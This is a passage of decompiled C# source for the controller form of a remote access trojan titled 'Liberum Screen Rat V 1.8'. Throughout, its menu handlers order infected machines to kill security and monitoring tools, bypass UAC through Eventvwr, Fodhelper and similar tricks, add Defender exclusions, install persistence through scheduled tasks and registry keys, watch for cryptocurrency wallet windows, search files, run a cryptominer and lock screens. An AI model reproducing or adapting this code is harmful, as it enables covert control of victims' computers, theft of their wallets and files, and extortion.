			list.ToArray()
		});
		string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
		Clients[] array2 = ClientsSelected();
		foreach (Clients clients in array2)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void deadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Dead processes";
		formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
		formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		List<object> list = new List<object>();
		string[] array = formInput.rjTextBox1.Texts.Split(',');
		foreach (string item in array)
		{
			list.Add(item);
		}
		byte[] pack = LEB128.Write(new object[2]
		{
			false,
			list.ToArray()
		});
		string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
		Clients[] array2 = ClientsSelected();
		foreach (Clients clients in array2)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem84_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Kill processes";
		formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
		formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			List<object> list = new List<object>();
			string[] array = formInput.rjTextBox1.Texts.Split(',');
			foreach (string item in array)
			{
				list.Add(item);
			}
			byte[] array2 = LEB128.Write(new object[2]
			{
				true,
				list.ToArray()
			});
			string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array2 };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_AntiProcess_Kill";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem85_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Dead processes";
		formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
		formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			List<object> list = new List<object>();
			string[] array = formInput.rjTextBox1.Texts.Split(',');
			foreach (string item in array)
			{
				list.Add(item);
			}
			byte[] array2 = LEB128.Write(new object[2]
			{
				true,
				list.ToArray()
			});
			string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array2 };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_AntiProcess_Dead";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void windowsExceToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Exclusion" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem87_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "runas" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_Runas";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem88_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "runassystem" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_RunSys";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem89_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "Eventvwr" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_Eventvwr";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem90_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "Fodhelper" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_Fodhelper";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem91_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "Computerdefaults" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_Computerdefaults";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem92_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "SDCLT" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_SDCLT";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem93_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "SLUI" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_SLUI";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem94_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] array = LEB128.Write(new object[1] { "DiskCleanup" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_DiskCleanup";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem97_Click(object sender, EventArgs e)
	{
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[1] { "Exit" };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Client_Exit";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem98_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			byte[] array = File.ReadAllBytes(openFileDialog.FileName);
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[2] { "Update", array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_Client_Update";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem99_Click(object sender, EventArgs e)
	{
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[1] { "Restart" };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Client_Restart";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem100_Click(object sender, EventArgs e)
	{
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[1] { "Uninstall" };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Client_Uninstall";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem103_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count != 0)
		{
			byte[] array = LEB128.Write(new object[1] { "Shutdown" });
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_System_Shutdown";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem104_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count != 0)
		{
			byte[] array = LEB128.Write(new object[1] { "Restart" });
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_System_Restart";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem105_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count != 0)
		{
			byte[] array = LEB128.Write(new object[1] { "Logoff" });
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_System_Logoff";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem101_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Exclusion" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Exclusion";
		AutoTaskMgr.AppendTask(task);
	}

	private void startupToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Startup" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem106_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Schtask" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void schtaskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "SchtaskHighest" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void regUserToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "RegUser" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void regMachineToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "RegMachine" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void regUserinitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "RegUserinit" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem108_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Startup" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Startup";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem109_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Schtask" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Schtask";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem110_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "SchtaskHighest" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Highest";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem111_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "RegUser" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_User";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem112_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "RegMachine" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Machine";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem113_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "RegUserinit" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Userinit";
		AutoTaskMgr.AppendTask(task);
	}

	private void setCriticalToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "CriticalSet" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Critical_Set";
		AutoTaskMgr.AppendTask(task);
	}

	private void exitCriticalToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "CriticalExit" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Critical_Exit";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem115_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "CriticalSet" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem116_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "CriticalExit" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void startToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Window";
		formInput.rjTextBox1.PlaceholderText = "Window1,Window2";
		formInput.rjTextBox1.Texts = "Crypto,Bitcoin,Metamask";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		List<object> list = new List<object>();
		string[] array = formInput.rjTextBox1.Texts.Split(',');
		foreach (string item in array)
		{
			list.Add(item);
		}
		byte[] pack = LEB128.Write(new object[1] { list.ToArray() });
		string checksum = Methods.GetChecksum("Plugin\\ReportWindow.dll");
		Clients[] array2 = ClientsSelected();
		foreach (Clients clients in array2)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void stopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if (clients.ReportWindow != null)
			{
				clients.ReportWindow.Disconnect();
				clients.ReportWindow = null;
			}
		}
	}

	private void toolStripMenuItem117_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Window";
		formInput.rjTextBox1.PlaceholderText = "Window1,Window2";
		formInput.rjTextBox1.Texts = "Crypto,Bitcoin,Metamask";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			List<object> list = new List<object>();
			string[] array = formInput.rjTextBox1.Texts.Split(',');
			foreach (string item in array)
			{
				list.Add(item);
			}
			byte[] array2 = LEB128.Write(new object[1] { list.ToArray() });
			string checksum = Methods.GetChecksum("Plugin\\ReportWindow.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array2 };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_ReportWindow";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void fileSearcherToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "File Searcher";
		formInput.rjTextBox1.PlaceholderText = ".png,.exe";
		formInput.rjTextBox1.Texts = ".txt,.pdf,.png";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		List<object> list = new List<object>();
		string[] array = formInput.rjTextBox1.Texts.Split(',');
		foreach (string item in array)
		{
			list.Add(item);
		}
		byte[] pack = LEB128.Write(new object[1] { list.ToArray() });
		string checksum = Methods.GetChecksum("Plugin\\FileSearcher.dll");
		Clients[] array2 = ClientsSelected();
		foreach (Clients clients in array2)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void minerRigelToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!MinerEtc.Visible && MinerEtc.work)
		{
			MinerEtc.Show();
		}
		if (MinerEtc.work)
		{
			return;
		}
		MinerEtc.Show();
		MinerEtc.work = true;
		string checksum = Methods.GetChecksum("Plugin\\MinerEtc.dll");
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void copyRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				string path = Path.Combine(new FileInfo(Application.ExecutablePath).Directory.FullName, "Users");
				StringCollection stringCollection = new StringCollection();
				Clients[] array = ClientsSelected();
				foreach (Clients clients in array)
				{
					stringCollection.Add(Path.Combine(path, clients.Hwid));
				}
				Clipboard.SetFileDropList(stringCollection);
			}
			catch
			{
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		thread.Join();
	}

	private void winlockerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count != 0)
		{
			FormWinlocker formWinlocker = new FormWinlocker();
			formWinlocker.clients = ClientsSelected();
			formWinlocker.ShowDialog();
		}
	}

	private void mapToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Map.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormMap)Application.OpenForms["Map:" + clients.Hwid] == null)
			{
				FormMap formMap = new FormMap();
				formMap.Name = "Map:" + clients.Hwid;
				formMap.parrent = clients;
				formMap.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void pluginClearToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { "PlugClear" });
		string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (timer1Key)
		{
			if (Text == "[Liberum Screen] Rat    V 1.8")
			{
				Text = "[Liberum Screen] Rat    V 1.";
			}
			else if (Text == "[Liberum Screen] Rat    V 1.")
			{
				Text = "[Liberum Screen] Rat    V 1";
			}
			else if (Text == "[Liberum Screen] Rat    V 1")
			{
				Text = "[Liberum Screen] Rat    V";
			}
			else if (Text == "[Liberum Screen] Rat    V")
			{
				Text = "[Liberum Screen] Rat";
			}
			else if (Text == "[Liberum Screen] Rat")
			{
				Text = "[Liberum Screen] Ra";
			}
			else if (Text == "[Liberum Screen] Ra")
			{
				Text = "[Liberum Screen] R";
			}
			else if (Text == "[Liberum Screen] R")
			{
				Text = "[Liberum Screen]";
			}
			else if (Text == "[Liberum Screen]")
			{
				Text = "[Liberum Screen";
			}
			else if (Text == "[Liberum Screen")
			{
				Text = "[Liberum Scree";
			}
			else if (Text == "[Liberum Scree")
			{
				Text = "[Liberum Scre";
			}
			else if (Text == "[Liberum Scre")
			{
				Text = "[Liberum Scr";
			}
			else if (Text == "[Liberum Scr")
			{
				Text = "[Liberum Sc";
			}
			else if (Text == "[Liberum Sc")
			{
				Text = "[Liberum S";
			}
			else if (Text == "[Liberum S")
			{
				Text = "[Liberum";
			}
			else if (Text == "[Liberum")
			{
				Text = "[Liberu";
			}
			else if (Text == "[Liberu")
			{
				Text = "[Liber";
			}
			else if (Text == "[Liber")
			{
				Text = "[Libe";
			}
			else if (Text == "[Libe")
			{
				Text = "[Lib";
			}
			else if (Text == "[Lib")
			{
				Text = "[Li";
			}
			else if (Text == "[Li")
			{
				Text = "[L";
			}
			else if (Text == "[L")
			{
				Text = "[Le";
			}
			else if (Text == "[Le")
			{
				Text = "[Leb";
			}
			else if (Text == "[Leb")
			{
				Text = "[Leb 1";
			}
			else if (Text == "[Leb 1")
			{
				Text = "[Leb 12";
			}
			else if (Text == "[Leb 12")
			{
				Text = "[Leb 128";
			}
			else if (Text == "[Leb 128")
			{
				Text = "[Leb 128]";
			}
			else if (Text == "[Leb 128]")
			{
				timer1Key = false;
			}
		}
		else if (Text == "[Leb 128]")
		{
			Text = "[Leb 128";
		}
		else if (Text == "[Leb 128")
		{
			Text = "[Leb 12";
		}
		else if (Text == "[Leb 12")
		{
			Text = "[Leb 1";
		}
		else if (Text == "[Leb 1")
		{
			Text = "[Leb";
		}
		else if (Text == "[Leb")
		{
			Text = "[Le";
		}
		else if (Text == "[Le")
		{
			Text = "[L";
		}
		else if (Text == "[L")
		{
			Text = "[Li";
		}
		else if (Text == "[Li")
		{
			Text = "[Lib";
		}
		else if (Text == "[Lib")
		{
			Text = "[Libe";
		}
		else if (Text == "[Libe")
		{
			Text = "[Liber";
		}
		else if (Text == "[Liber")
		{
			Text = "[Liberu";
		}
		else if (Text == "[Liberu")
		{
			Text = "[Liberum";
		}
		else if (Text == "[Liberum")
		{
			Text = "[Liberum S";
		}
		else if (Text == "[Liberum S")
		{
			Text = "[Liberum Sc";
		}
		else if (Text == "[Liberum Sc")
		{
			Text = "[Liberum Scr";
		}
		else if (Text == "[Liberum Scr")
		{
			Text = "[Liberum Scre";
		}
		else if (Text == "[Liberum Scre")
		{
			Text = "[Liberum Scree";
		}
		else if (Text == "[Liberum Scree")
		{
			Text = "[Liberum Screen";
		}
		else if (Text == "[Liberum Screen")
		{
			Text = "[Liberum Screen]";
		}
		else if (Text == "[Liberum Screen]")
		{
			Text = "[Liberum Screen] R";
		}
		else if (Text == "[Liberum Screen] R")
		{
			Text = "[Liberum Screen] Ra";
		}
		else if (Text == "[Liberum Screen] Ra")
		{
			Text = "[Liberum Screen] Rat";
		}
		else if (Text == "[Liberum Screen] Rat")
		{
			Text = "[Liberum Screen] Rat    V";
		}
		else if (Text == "[Liberum Screen] Rat    V")
		{
			Text = "[Liberum Screen] Rat    V 1";
		}
		else if (Text == "[Liberum Screen] Rat    V 1")
		{
			Text = "[Liberum Screen] Rat    V 1.";
		}
		else if (Text == "[Liberum Screen] Rat    V 1.")
		{
			Text = "[Liberum Screen] Rat    V 1.8";
			timer1Key = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Form1));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
